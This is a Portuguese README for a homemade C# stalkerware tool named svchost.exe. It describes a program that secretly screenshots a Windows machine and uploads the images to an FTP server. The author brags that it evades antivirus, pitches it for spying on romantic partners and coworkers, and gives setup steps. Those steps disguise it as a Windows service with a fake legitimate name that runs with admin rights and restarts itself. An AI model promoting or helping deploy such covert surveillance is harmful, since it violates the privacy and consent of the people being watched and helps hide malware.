svchost ? WTF
===
__"Não perca seu tempo instalando antivirus. Eles são o piores virus que existem e só deixam sua máquina lenta. Quer se proteger de verdade? Entenda como funcionam os virus!"__

Tenho feito essa afirmação nos últimos 4 anos da minha vida de garoto de programa. As vezes alguns me perguntam qual o melhor antivirus e eu digo nenhum. Uns não entendem, outros começam a discutir e outros acham que eu estou falando abrobrinha. Tolos. Para provar criei esse programa em 2006, em C# e dotnet 1.1, que ao instalado na máquina fica tirando screenshots da máquina em que está instalado e enviando para um ftp de sua escolha em um tempo pré determinado. Já passou no teste de dezenas de anti-virus e é praticamente indetectável. Funciona que é uma beleza, na rede local :)

__(modo polishop on)

E não é só isso!
Se você tem dúvida que seu companheiro de relacionamento está te sacaneando ou quer só espionar aquele membro da equipe folgado, que vc sabe que não está fazendo nada, só matando tempo e na sua frente faz se parecer a pessoa mais esforçada e estudiosa do planeta, esse programa é para você. Agora você pode espiona-lo 24 horas por dia sem nenhum esforço na tranqualidade do seu pc.

__(/modo polishop off) 

E antes de pensar em usá-lo, para não vir me chingar depois, lembre-se:
"A ignorância é uma benção" (http://www.interney.net/blogs/inagaki/2008/03/04/o_poder_da_ignorancia/)
======

Instalação
===
1. Clone ou faça o download do projeto do github.
2. Entre no diretório bin\Release e configure o arquivo svchost.exe.config com o nome de usuário e senha do ftp, ip, e o intervalo em milisegundos que vc quer os screenshots.
3. Execute o instala.bat
4. Encontre o serviço "Assistente de detecção do hardware do shell". Sim eu sei. Tem 2, se você estiver usando o rWindows em português. Escolha o correto :). Se não souber qual o correto, morra lentamente!
5. Configure um login de administrador no serviço, e dê permissão para que o serviço possa interagir com o desktop.
6. Configure o serviço para que ele possa iniciar automaticamente, e reiniciar em caso de falha.
7. Descubra se você tinha razão! E solte aquele clássico "Eu sabia ...". Não, vc não sabia! LOL

Não use para o MAL :|

luisbebop@gmail.com